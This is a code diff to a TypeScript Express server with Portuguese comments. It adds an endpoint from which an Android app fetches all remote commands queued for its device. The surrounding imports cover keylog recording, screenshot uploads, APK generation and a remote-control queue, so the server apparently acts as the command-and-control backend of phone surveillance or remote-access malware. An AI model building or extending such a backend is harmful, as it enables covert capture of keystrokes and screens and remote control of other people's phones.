@@ -15,7 +15,7 @@ import { generateAPK } from "../apk-generator";
 import { ENV } from "./env";
 import { getAdminUser, getUserByOpenId, upsertUser, createKeylog } from "../db";
 import { createOrUpdateApp, createScreenshot } from "../corporate-db";
-import { dequeueNextCommand } from "../remote-control-queue";
+import { dequeueNextCommand, dequeueAllCommands } from "../remote-control-queue";
 
 const LOCAL_AUTH_EMAIL = (process.env.LOCAL_AUTH_EMAIL ?? "admin@faztudo.com").trim().toLowerCase();
 const SCREENSHOT_STORAGE_DIR = path.resolve(process.cwd(), "uploads", "screenshots");
@@ -547,6 +547,29 @@ async function startServer() {
         success: false,
         message,
       });
+    }
+  });
+
+  // Endpoint usado pelo app Android para buscar todos os comandos pendentes
+  app.post("/api/device/commands/pending", async (req, res) => {
+    try {
+      const rawDeviceUid = typeof req.body?.deviceUid === "string" ? req.body.deviceUid : "";
+      const rawPackageName = typeof req.body?.packageName === "string" ? req.body.packageName : "";
+      const rawDeviceName = typeof req.body?.deviceName === "string" ? req.body.deviceName : "";
+      const rawModel = typeof req.body?.model === "string" ? req.body.model : "Android";
+
+      if (!rawDeviceUid || !rawPackageName) {
+        return res.status(400).json({ success: false, message: "deviceUid e packageName sao obrigatorios" });
+      }
+
+      const targetUser = await resolveDeviceOwner();
+      const { deviceId } = buildDeviceIdentity(rawPackageName, rawDeviceUid, rawDeviceName, rawModel);
+      const commands = dequeueAllCommands(targetUser.id, deviceId);
+
+      return res.json({ success: true, deviceId, commands });
+    } catch (error) {
+      console.error("[Device Commands Pending] Failed:", error);
+      return res.status(500).json({ success: false, message: "Falha ao buscar comandos" });
     }
   });
 
